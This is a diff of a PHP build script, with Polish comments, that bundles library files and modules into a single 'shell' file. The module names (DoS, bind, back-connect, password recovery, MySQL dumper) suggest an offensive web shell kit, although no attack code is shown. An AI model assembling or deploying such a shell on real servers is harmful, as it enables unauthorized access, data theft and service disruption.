@@ -1,16 +1,35 @@
 <?php
 
+/**
+ * Wymagane PHP 5.3
+ */
+
 $sData = "<?php\r\n";
 
 if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 {
-	$aFiles = array( 'LibProd/Arr', 'LibProd/Form', 'LibProd/Request' );
+	$aFiles = array( 'LibProd/Arr', 'LibProd/Request', 'LibProd/ShellInterface' );
 
 	if( ! isset( $argv[1] ) )
 	{
-		$aFiles = array_merge( $aFiles, array( 'Lib/ModuleMysqlDumper', 'Lib/ModulePasswordRecovery', 'Lib/ModuleDos', 'Lib/ModuleProxy', 'Lib/ModuleBind', 'Lib/ModuleBackConnect' ) );
+		$oDirectory = new DirectoryIterator( 'Modules' );
+
+		foreach( $oDirectory as $oFile )
+		{
+			if( is_file( $sFile = $oFile -> getPathname() ) )
+			{
+				$aFiles[] = 'Modules/' . basename( $sFile, '.php' );
+			}
+		}
 	}
-	$aFiles = array_merge( $aFiles, array( 'shell' ) );
+	else
+	{
+		$aFiles[] = 'Modules/Ls';
+	}
+
+	$aFiles[] = 'shell';
+
+	print_r( $aFiles );
 
 	foreach( $aFiles as $sFile )
 	{
@@ -23,12 +42,17 @@ if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 }
 else if( isset( $argv[1] ) && ( $argv[1] === 'modules' ) )
 {
-	foreach( array( 'Lib/ModuleMysqlDumper', 'Lib/ModulePasswordRecovery', 'Lib/ModuleDos', 'Lib/ModuleProxy', 'Lib/ModuleBind', 'Lib/ModuleBackConnect' ) as $sFile )
+
+	$oDirectory = new DirectoryIterator( 'Modules' );
+
+	foreach( $oDirectory as $oFile )
 	{
-		$sData .= file_get_contents( $sFile . '.php', NULL, NULL, 6 );
+		if( is_file( $sFile = $oFile -> getPathname() ) )
+		{
+			$sData .= file_get_contents( $sFile, NULL, NULL, 6 );
+		}
 	}
 }
-
 
 
 
